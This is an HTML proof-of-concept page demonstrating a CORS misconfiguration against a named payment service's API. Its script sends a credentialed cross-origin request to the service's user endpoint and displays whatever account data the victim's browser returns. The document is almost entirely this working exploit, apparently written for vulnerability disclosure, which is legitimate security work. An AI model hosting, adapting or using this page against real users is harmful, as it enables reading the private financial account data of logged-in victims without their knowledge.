<!DOCTYPE html>
  <html>
  <head>
    <title>Hyperwallet CORS PoC</title>
  </head>
  <body>
    <h2>Hyperwallet CORS PoC</h2>
    <pre id="output">Loading...</pre>
    <script>
      fetch('https://api.paylution.com/rest/v3/users', {
        credentials: 'include'
      })
      .then(r => {
        document.getElementById('output').textContent =
          'Status: ' + r.status + '\nCORS allowed read: YES';
        return r.text();
      })
      .then(body => {
        document.getElementById('output').textContent += '\n\nResponse body:\n' + body;
      })
      .catch(e => {
        document.getElementById('output').textContent = 'Error: ' + e.message;
      });
    </script>
  </body>
  </html>
